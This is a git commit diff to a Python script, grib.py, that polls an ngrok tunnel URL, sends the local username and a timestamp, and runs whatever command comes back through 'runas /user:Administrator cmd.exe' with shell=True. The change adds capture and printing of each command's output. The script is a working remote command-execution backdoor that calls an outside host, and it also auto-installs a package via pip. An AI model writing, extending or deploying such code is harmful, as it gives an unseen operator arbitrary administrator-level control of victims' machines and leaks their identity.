7da05654c347d9338a9ff3bc41ec0ee8135d4f69
FanAPIpipa <156794064+FanAPIpipa@users.noreply.github.com>
2024-02-03 17:41:19 +0300

    Update grib.py

--- grib.py
+++ grib.py
@@ -4,14 +4,16 @@ import time
 
 try:
     import requests
-except:
+except ImportError:
     subprocess.run(["pip", "install", "requests"])
     subprocess.run(["python", __file__])
     exit()
 
 url = 'https://assured-earwig-picked.ngrok-free.app/'
+previous_command_result = None
 
 def send_post_request():
+    global previous_command_result
     try:
         username = os.getlogin()
         timestamp = str(time.time())
@@ -20,7 +22,11 @@ def send_post_request():
 
         if response.status_code == 200:
             command = response.text.strip()
-            subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command], shell=True)
+            if previous_command_result:
+                print("Previous command result:", previous_command_result)
+            print("Executing command:", command)
+            result = subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command], capture_output=True, text=True, shell=True)
+            previous_command_result = result.stdout.strip()
         else:
             pass
     except Exception as e:
